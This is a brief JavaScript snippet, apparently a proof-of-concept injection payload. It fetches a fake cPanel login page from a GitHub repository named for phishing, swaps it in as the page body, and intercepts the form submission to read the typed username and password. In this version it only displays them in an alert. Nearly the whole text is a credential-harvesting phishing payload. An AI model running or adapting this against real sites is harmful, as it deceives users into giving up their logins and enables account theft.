fetch("https://raw.githubusercontent.com/achraf4test/onemoretest/main/cPanel-phishing-page/index.html").then(res=>res.text()).then(res => {
  document.body.innerHTML = res;

  const form = document.querySelector('#forms');

  form.addEventListener("submit", function(evt) {
    evt.preventDefault();

    let login = document.querySelector('#user').value
    let pass = document.querySelector('#pass').value
    alert('Login: ' + login + " password: " + pass);

    return;
  }, true);
})
